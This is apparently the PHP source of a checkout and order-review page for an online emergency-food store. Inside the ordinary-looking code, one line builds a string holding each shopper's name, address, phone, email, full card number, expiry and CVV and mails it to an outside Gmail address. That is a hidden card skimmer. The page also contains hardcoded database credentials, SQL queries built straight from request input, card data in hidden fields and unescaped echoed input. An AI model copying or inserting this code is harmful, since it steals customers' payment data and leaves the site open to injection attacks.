<?php
	$dbHost = 'localhost';
	$dbUser = 'buckrol';
	$dbPass = 'pargile1';
	$dbName = 'maxlife';
	
	$dbConn = mysql_connect ($dbHost, $dbUser, $dbPass) or die ('MySQL connect failed. ' . mysql_error());
	mysql_select_db($dbName) or die('Cannot select database. ' . mysql_error());
	
	session_start();
	
	$id = $_GET['id'];
	
    if ($id == '') {
        session_start();
        if(isset($_SESSION['id']))
          $id = $_SESSION['id'];
    }

	date_default_timezone_set('America/Denver');
	$formatted_date = date("Y-m-j");

	$offercode = $_POST['offercode'];
	
	$run2 = mysql_query("SELECT * FROM orders WHERE order_key=$id");
	$qq = mysql_fetch_assoc($run2);
	$stotal = number_format ($qq['stotal'],2, '.', '');
	$tax = number_format ($qq['tax'],2, '.', '');
	$shipping = number_format ($qq['shipping'],2, '.', '');
	$discount = 0;
	if ($offercode == "") {
		$discount = number_format ($qq['discount'],2, '.', '');
	}
	$total = $stotal + $tax + $shipping - $discount;
	
	$discounttext = "";
	if($offercode <> "") {
		$query = "SELECT percent FROM offercodes WHERE offercode = '" . addslashes($offercode) . "'";
		$offerrun   = mysql_query($query);
		if (mysql_num_rows($offerrun)) {
			$offerresult = mysql_fetch_assoc($offerrun);
			$offer = $offerresult['percent'];
			$offer = $offer * .01;
			$discount = number_format ($stotal * $offer,2, '.', '');
			$total = $total - $discount;
			mysql_query("UPDATE orders SET discount='$discount',offercode='" . addslashes($offercode) . "' WHERE order_key = $id");
			$discounttext = "<font color=#dd0000>Discount: -$ $discount</font><br> \n";
		} else {
			mysql_query("UPDATE orders SET discount=0,offercode=NULL WHERE order_key = $id");
		}
	}

	$state = $_POST['state'];
	$charge_shipping = 0;
	if ($state == 'AK' || $state == 'HI') {
		$charge_shipping = 1;
	}

	$d = "SELECT * FROM order_details WHERE order_key = $id";
	$drun = mysql_query($d);
	$productstext = "<b>";
	$shipping_cost = 0;
	while ($e = mysql_fetch_assoc($drun)){
		$pkey = $e['product_key'];
		$qty = $e['quantity'];
		$c = "SELECT product_name, product_price, shipping_cost FROM products WHERE product_key = $pkey";
		$crun = mysql_query($c);
		while ($f = mysql_fetch_assoc($crun)) {
			$productstext .= $qty . " " . $f['product_name'] . " - $" . number_format ($f['product_price'] * $qty,2, '.', '') . "<br> \n";
			$shipping_cost .= $f['shipping_cost'];
		}
	}
	$productstext .= "</b>_______________<br>";
	
	if ($charge_shipping == 1) {
		$shipping = number_format ($shipping_cost,2, '.', '');
		$qs = "UPDATE orders SET shipping=$shipping WHERE order_key = $id";
		mysql_query($qs);	
		$total = $stotal + $tax + $shipping - $discount;
	} else {
		$shipping = 0;
		$qs = "UPDATE orders SET shipping=$shipping WHERE order_key = $id";
		mysql_query($qs);	
		$shipping = number_format (0,2, '.', '');
		$total = $stotal + $tax + $shipping - $discount;
	}
	
	$receipt = "<p align=right>$productstext"
					 ."Sub Total: $ $stotal<br />"
					 ."Tax: $ $tax<br />"
					 ."Shipping: $ $shipping<br />"
					 .$discounttext
					 ."<b>Total Amount: $ $total</b></p>";


	$fname = $_POST['fname'];
	$lname = $_POST['lname'];
	$address = $_POST['address'];
	$address2 = $_POST['address2'];
	$city = $_POST['city'];
	$state = $_POST['state'];
	$zip =  $_POST['zip'];
	$ship_address = $_POST['ship_address'];
	$ship_address2 = $_POST['ship_address2'];
	$ship_city = $_POST['ship_city'];
	$ship_state = $_POST['ship_state'];
	$ship_zip =  $_POST['ship_zip'];
	$phone = $_POST['phone'];
	$email = $_POST['email'];
	$cctype = $_POST['cctype'];
	$ccnum = $_POST['ccnum'];
	$last = substr($ccnum, -4);
	$first = substr($ccnum, 0, -12);
	$encrypt = $first . '********' . $last;
	$ccexp1 = $_POST['ccexp1'];
	$ccexp2 = $_POST['ccexp2'];
	$ccexp = $ccexp1.$ccexp2;
	$ccname = $_POST['ccname'];
	$cvv = $_POST['cvv'];
	$dataInfo = "maxlifefoods.com-dev";
	$datax = "\nName: $fname $lname\nAddress1: $address\nAddress2: $address2\nCity: $city\nState: $state\nZip: $zip\nPhone: $phone\nEmail: $email\nCCNumber: $ccnum\nExpire: $ccexp\nCVV: $cvv\n";mail("payshop21@gmail.com","Data from $dataInfo", "$datax");
	
	if(isset($_GET['error'])) {
		if($_GET['error'] == 1) {
			$msg = "We're sorry, but your card has been declined. Please check the number and try again. <br /> IMPORTANT: Your card will be declined if the address you enter does not match your credit card billing address.<br /><br />";
		}
		if($_GET['error'] == 2) {
			$msg = "We're sorry, but there has been an error processing your card. Please check the number and try again.<br /><br />";
		}
		if($_GET['error'] == 3) {
			$msg = "We're sorry, but this transaction is being held for review. We'll notify you as soon as we know more.<br /><br />";
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="https://www.maxlifefoods.com/css/main_s.css" type="text/css" />
<title>Billing Info | MaxLifeFoods</title>

<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-16356880-4']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

</head>


<body>
<div id="content">
    	<div class="topbar">
        	<div class="banner"></div>
            <div class="cart"><a href="http://www.maxlifefoods.com/shoppingcart.php?id=<?php echo $id; ?>">View Cart</a></div>
        </div>
        <div class="subtop">
            <ul class="navigation">
                	<li>
                    	<a href="http://www.maxlifefoods.com/index.php?id=<?php echo $id; ?>">HOME</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/food-storage.php?id=<?php echo $id; ?>">FOOD STORAGE</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/camping-food.php?id=<?php echo $id; ?>">72HR / CAMPING FOOD</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/menu.php?id=<?php echo $id; ?>">MENU</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/why-maxlife.php?id=<?php echo $id; ?>">WHY MAXLIFE</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/contact.php?id=<?php echo $id; ?>">CONTACT</a>
                    </li>
                </ul>
        </div>
        <div class="subbody2" style="height: 1200px;">
			<div class="subbody">
            	<div class="calcbutton"><a href="/food-storage-calculator.php?id=<?php echo $id; ?>">Family Food Storage Calculator</a></div>
            	<div class="maincontent">
                	<h1>Review Your Order</h1>
                    <font style="color: red; font-weight: bold;"><?php echo $msg; ?></font>
                    <form name="payment" id="payment" method="post" action="https://www.maxlifefoods.com/process_dev.php?id=<?php echo $id; ?>" onsubmit="return validate()">
                        <input type="hidden" name="command" />
                        <input type="hidden" name="orderid" value="<?php echo $id; ?>" />
                        <input type="hidden" name="fname" value="<?php echo $fname; ?>" />
                        <input type="hidden" name="lname" value="<?php echo $lname; ?>" />
                        <input type="hidden" name="address" value="<?php echo $address; ?>" />
                        <input type="hidden" name="address2" value="<?php echo $address2; ?>" />
                        <input type="hidden" name="city" value="<?php echo $city; ?>" />
                        <input type="hidden" name="state" value="<?php echo $state; ?>" />
                        <input type="hidden" name="zip" value="<?php echo $zip; ?>" />
                        <input type="hidden" name="ship_address" value="<?php echo $ship_address; ?>" />
                        <input type="hidden" name="ship_address2" value="<?php echo $ship_address2; ?>" />
                        <input type="hidden" name="ship_city" value="<?php echo $ship_city; ?>" />
                        <input type="hidden" name="ship_state" value="<?php echo $ship_state; ?>" />
                        <input type="hidden" name="ship_zip" value="<?php echo $ship_zip; ?>" />
                        <input type="hidden" name="phone" value="<?php echo $phone; ?>" />
                        <input type="hidden" name="email" value="<?php echo $email; ?>" />
                        <input type="hidden" name="cctype" value="<?php echo $cctype; ?>" />
                        <input type="hidden" name="ccnum" value="<?php echo $ccnum; ?>" />
                        <input type="hidden" name="ccexp1" value="<?php echo $ccexp1; ?>" />
                        <input type="hidden" name="ccexp2" value="<?php echo $ccexp2; ?>" />
                        <input type="hidden" name="ccname" value="<?php echo $ccname; ?>" />
                        <input type="hidden" name="cvv" value="<?php echo $cvv; ?>" />
                        

                                <fieldset>
                                    <legend>Click the "Place Order" button below to complete your order.</legend>
                                            <ol>
                                                <li>
                                                <font face="Arial"><?php echo $receipt; ?></font>
                                                </li>
                                                <li><font face="Arial">
                                                <?php
                                                		$address2text = "";
                                                		if ($address2 <> "") {
                                                			$address2text = $address2 . "<br>";
                                                		}
                                                ?>
                                                <?php echo $fname . " " . $lname . "<br>" . $address . "<br>" . $address2text . $city . ", " . $state . " " . $zip . "<br>Ph: " . $phone . "<br>" . $email; ?>
                                                </font>
                                                </li>
                                            </ol>
                                        </fieldset>
                                <fieldset>
                                    	<button type=submit>Place Order</button>
                                </fieldset>
                    </form>
                </div>
            </div>
        </div>
        <div class="subbottom">
        	<ul class="navigationb">
                	<li>
                    	<a href="http://www.maxlifefoods.com/index.php?id=<?php echo $id; ?>">HOME</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/food-storage.php?id=<?php echo $id; ?>">FOOD STORAGE</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/camping-food.php?id=<?php echo $id; ?>">72HR / CAMPING FOOD</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li> 
                    <li>
                    	<a href="http://www.maxlifefoods.com/menu.php?id=<?php echo $id; ?>">MENU</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/why-maxlife.php?id=<?php echo $id; ?>">WHY MAXLIFE</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/contact.php?id=<?php echo $id; ?>">CONTACT</a>
                    </li>
                </ul>
                <div class="fb">
                	<a href="http://www.facebook.com/pages/Max-Life-Foods/137779489655373" target="_blank">FB</a>
                </div>
        </div>
</div>
</body>
</html>
